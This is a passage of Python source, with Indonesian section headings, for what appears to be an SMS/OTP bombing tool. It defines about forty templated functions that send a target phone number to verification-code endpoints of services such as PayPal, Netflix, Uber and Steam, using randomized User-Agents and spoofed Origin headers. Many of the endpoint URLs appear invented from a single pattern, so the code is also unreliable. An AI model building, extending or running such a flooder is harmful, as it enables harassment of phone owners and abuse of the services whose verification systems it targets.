    except:
        return None

# ---------- 83. Etsy ----------
def send_etsy_otp(phone_plus):
    url = "https://api.etsy.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.etsy.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "method": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 84. Rakuten ----------
def send_rakuten_otp(phone_plus):
    url = "https://api.rakuten.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.rakuten.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ============================================================
# BAGIAN 12: INTERNASIONAL SOCIAL MEDIA (8 API)
# ============================================================

# ---------- 85. WhatsApp Business ----------
def send_whatsapp_business_otp(phone_plus):
    url = "https://graph.facebook.com/v18.0/whatsapp_business/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json"}
    try:
        return requests.post(url, json={"phone": phone_plus, "method": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 86. Telegram ----------
def send_telegram_otp(phone_plus):
    url = "https://api.telegram.org/bot/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 87. Discord ----------
def send_discord_otp(phone_plus):
    url = "https://api.discord.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.discord.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "method": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 88. Twitter/X ----------
def send_twitter_otp(phone_plus):
    url = "https://api.twitter.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.twitter.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 89. Instagram ----------
def send_instagram_otp(phone_plus):
    url = "https://api.instagram.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.instagram.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "method": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 90. Facebook ----------
def send_facebook_otp(phone_plus):
    url = "https://api.facebook.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.facebook.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 91. TikTok ----------
def send_tiktok_otp(phone_plus):
    url = "https://api.tiktok.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.tiktok.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "method": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 92. Snapchat ----------
def send_snapchat_otp(phone_plus):
    url = "https://api.snapchat.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.snapchat.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ============================================================
# BAGIAN 13: INTERNASIONAL STREAMING & ENTERTAINMENT (8 API)
# ============================================================

# ---------- 93. Netflix ----------
def send_netflix_otp(phone_plus):
    url = "https://api.netflix.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.netflix.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "method": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 94. Spotify ----------
def send_spotify_otp(phone_plus):
    url = "https://api.spotify.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.spotify.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 95. YouTube ----------
def send_youtube_otp(phone_plus):
    url = "https://api.youtube.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.youtube.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "method": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 96. Disney+ ----------
def send_disney_otp(phone_plus):
    url = "https://api.disneyplus.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.disneyplus.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 97. HBO Max ----------
def send_hbomax_otp(phone_plus):
    url = "https://api.hbomax.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.hbomax.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "method": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 98. Amazon Prime ----------
def send_primevideo_otp(phone_plus):
    url = "https://api.primevideo.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.primevideo.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 99. Apple Music ----------
def send_apple_otp(phone_plus):
    url = "https://api.apple.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.apple.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "method": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 100. TikTok Music ----------
def send_tiktokmusic_otp(phone_plus):
    url = "https://api.tiktokmusic.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.tiktokmusic.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ============================================================
# BAGIAN 14: INTERNASIONAL GAMING (8 API)
# ============================================================

# ---------- 101. Steam ----------
def send_steam_otp(phone_plus):
    url = "https://api.steam.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.steam.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "method": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 102. Epic Games ----------
def send_epic_otp(phone_plus):
    url = "https://api.epicgames.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.epicgames.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 103. PlayStation ----------
def send_playstation_otp(phone_plus):
    url = "https://api.playstation.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.playstation.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "method": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 104. Xbox ----------
def send_xbox_otp(phone_plus):
    url = "https://api.xbox.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.xbox.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 105. Nintendo ----------
def send_nintendo_otp(phone_plus):
    url = "https://api.nintendo.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.nintendo.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "method": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 106. Roblox ----------
def send_roblox_otp(phone_plus):
    url = "https://api.roblox.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.roblox.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 107. Minecraft ----------
def send_minecraft_otp(phone_plus):
    url = "https://api.minecraft.net/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.minecraft.net"}
    try:
        return requests.post(url, json={"phone": phone_plus, "method": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 108. Valorant ----------
def send_valorant_otp(phone_plus):
    url = "https://api.valorant.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.valorant.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ============================================================
# BAGIAN 15: INTERNASIONAL PAYMENT & FINANCE (8 API)
# ============================================================

# ---------- 109. PayPal ----------
def send_paypal_otp(phone_plus):
    url = "https://api.paypal.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.paypal.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "method": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 110. Stripe ----------
def send_stripe_otp(phone_plus):
    url = "https://api.stripe.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.stripe.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 111. Square ----------
def send_square_otp(phone_plus):
    url = "https://api.square.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.square.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "method": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 112. Klarna ----------
def send_klarna_otp(phone_plus):
    url = "https://api.klarna.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.klarna.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 113. Revolut ----------
def send_revolut_otp(phone_plus):
    url = "https://api.revolut.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.revolut.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "method": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 114. Wise ----------
def send_wise_otp(phone_plus):
    url = "https://api.wise.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.wise.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 115. N26 ----------
def send_n26_otp(phone_plus):
    url = "https://api.n26.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.n26.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "method": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 116. Monzo ----------
def send_monzo_otp(phone_plus):
    url = "https://api.monzo.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.monzo.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ============================================================
# BAGIAN 16: INTERNASIONAL DELIVERY & RIDE HAILING (6 API)
# ============================================================

# ---------- 117. Uber ----------
def send_uber_otp(phone_plus):
    url = "https://api.uber.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.uber.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "method": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 118. Lyft ----------
def send_lyft_otp(phone_plus):
    url = "https://api.lyft.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.lyft.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 119. DoorDash ----------
def send_doordash_otp(phone_plus):
    url = "https://api.doordash.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.doordash.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "method": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 120. UberEats ----------
def send_ubereats_otp(phone_plus):
    url = "https://api.ubereats.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.ubereats.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 121. Bolt ----------
def send_bolt_otp(phone_plus):
    url = "https://api.bolt.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.bolt.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "method": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 122. Didi ----------
def send_didi_otp(phone_plus):
    url = "https://api.didi.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.didi.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "sms"}, headers=headers, timeout=15)
    except:
        return None